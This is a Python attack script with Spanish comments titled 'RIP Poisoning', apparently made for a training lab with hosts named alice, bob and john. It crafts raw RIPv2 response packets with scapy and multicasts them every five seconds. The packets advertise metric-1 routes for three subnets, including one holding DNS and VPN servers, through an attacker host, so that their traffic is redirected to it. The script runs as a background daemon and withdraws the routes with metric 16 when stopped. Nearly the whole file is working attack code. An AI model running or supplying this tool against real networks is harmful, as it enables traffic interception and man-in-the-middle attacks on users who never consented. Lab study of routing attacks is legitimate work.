#!/usr/bin/env python3
"""
Ataque 1 — RIP Poisoning
Inyecta una ruta por defecto falsa (0.0.0.0/0 via john, metrica 1) en router_b
via RIP v2 usando bytes crudos (sin scapy.contrib.rip).
Al parar, retira la ruta enviando metrica 16 (infinity).

Uso: python3 attack_rip.py [start|stop|status]
"""

import sys
import os
import signal
import time
import struct
import socket

PID_FILE = "/tmp/attack_rip.pid"

JOHN_IP      = "192.168.2.2"
RIP_MCAST    = "224.0.0.9"          # direccion multicast RIPv2
RIP_MCAST_MAC = "01:00:5e:00:00:09" # MAC multicast correspondiente
INTERVAL     = 5   # segundos entre envios (igual que el timer RIP del lab)


def get_iface_by_ip(ip):
    import subprocess
    out = subprocess.check_output(["ip", "-4", "addr"]).decode()
    current = None
    for line in out.splitlines():
        if line[0].isdigit():
            current = line.split(":")[1].strip().split("@")[0]
        elif ip in line:
            return current
    return "eth0"


def get_mac_by_iface(iface):
    import subprocess
    out = subprocess.check_output(["ip", "link", "show", iface]).decode()
    for token in out.split():
        if len(token) == 17 and token.count(":") == 5:
            return token
    return "00:00:00:00:00:00"


def build_rip_payload(network="0.0.0.0", mask="0.0.0.0", nexthop="0.0.0.0", metric=1):
    """
    RIPv2 Response con una entrada:
      Header: cmd=2 (response), ver=2, mbz=0
      Entry:  AFI=2 (IP), tag=0, addr, mask, nexthop, metric
    """
    header = struct.pack("!BBH", 2, 2, 0)
    entry  = (struct.pack("!HH", 2, 0) +
              socket.inet_aton(network) +
              socket.inet_aton(mask) +
              socket.inet_aton(nexthop) +
              struct.pack("!I", metric))
    return header + entry


def send_rip(payload, src_ip, src_mac, iface):
    """Envia el paquete RIP via L2 (sendp) al multicast RIPv2 224.0.0.9."""
    from scapy.all import Ether, IP, UDP, Raw, sendp
    pkt = (
        Ether(src=src_mac, dst=RIP_MCAST_MAC) /
        IP(src=src_ip, dst=RIP_MCAST, ttl=1) /
        UDP(sport=520, dport=520) /
        Raw(load=payload)
    )
    sendp(pkt, iface=iface, verbose=False)


# Redes a envenenar: redirigir su trafico a traves de John
# FRR rechaza 0.0.0.0/0, solo acepta redes unicast especificas
POISON_ROUTES = [
    ("192.168.1.0", "255.255.255.0"),  # network1: alice + bob
    ("192.168.3.0", "255.255.255.0"),  # network3: DNS + VPN
    ("192.168.4.0", "255.255.255.192"),# network4_ext: acceso a firewall
]


def build_multi_rip_payload(routes, nexthop, metric):
    """RIPv2 Response con multiples entradas."""
    header = struct.pack("!BBH", 2, 2, 0)
    entries = b""
    for network, mask in routes:
        entries += (struct.pack("!HH", 2, 0) +
                    socket.inet_aton(network) +
                    socket.inet_aton(mask) +
                    socket.inet_aton(nexthop) +
                    struct.pack("!I", metric))
    return header + entries


def attack_loop():
    iface   = get_iface_by_ip(JOHN_IP)
    mac     = get_mac_by_iface(iface)
    payload = build_multi_rip_payload(POISON_ROUTES, nexthop=JOHN_IP, metric=1)
    nets    = ", ".join(f"{n}/{m}" for n, m in POISON_ROUTES)
    print(f"[RIP] Envenenando rutas: {nets} -> {JOHN_IP}  iface={iface} cada {INTERVAL}s", flush=True)
    while True:
        send_rip(payload, JOHN_IP, mac, iface)
        time.sleep(INTERVAL)


def cleanup():
    iface   = get_iface_by_ip(JOHN_IP)
    mac     = get_mac_by_iface(iface)
    payload = build_multi_rip_payload(POISON_ROUTES, nexthop=JOHN_IP, metric=16)
    print("[RIP] Enviando retirada de rutas (metrica 16)...", flush=True)
    for _ in range(3):
        send_rip(payload, JOHN_IP, mac, iface)
        time.sleep(0.3)
    print("[RIP] Rutas retiradas. Convergencia RIP en <30s.")


def start():
    if os.path.exists(PID_FILE):
        pid = open(PID_FILE).read().strip()
        print(f"[!] El ataque ya esta activo (PID {pid}). Para primero con 'stop'.")
        sys.exit(1)

    pid = os.fork()
    if pid > 0:
        open(PID_FILE, "w").write(str(pid))
        print(f"[+] RIP Poisoning iniciado (PID {pid})")
        sys.exit(0)

    os.setsid()
    sys.stdout = open("/tmp/attack_rip.log", "w", buffering=1)
    sys.stderr = sys.stdout
    attack_loop()


def stop():
    if not os.path.exists(PID_FILE):
        print("[-] El ataque no esta activo.")
        return

    pid = int(open(PID_FILE).read().strip())
    try:
        os.kill(pid, signal.SIGTERM)
        time.sleep(0.5)
    except ProcessLookupError:
        print("[!] Proceso no encontrado, limpiando PID file.")

    os.remove(PID_FILE)
    cleanup()
    print("[+] RIP Poisoning detenido y ruta retirada.")


def status():
    if os.path.exists(PID_FILE):
        pid = open(PID_FILE).read().strip()
        alive = os.path.exists(f"/proc/{pid}")
        state = "activo" if alive else "PID file huerfano"
        print(f"[*] RIP Poisoning: {state} (PID {pid})")
        print(f"    Log: tail -f /tmp/attack_rip.log")
    else:
        print("[-] RIP Poisoning: inactivo")


if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] not in ("start", "stop", "status"):
        print(f"Uso: {sys.argv[0]} [start|stop|status]")
        sys.exit(1)
    {"start": start, "stop": stop, "status": status}[sys.argv[1]]()
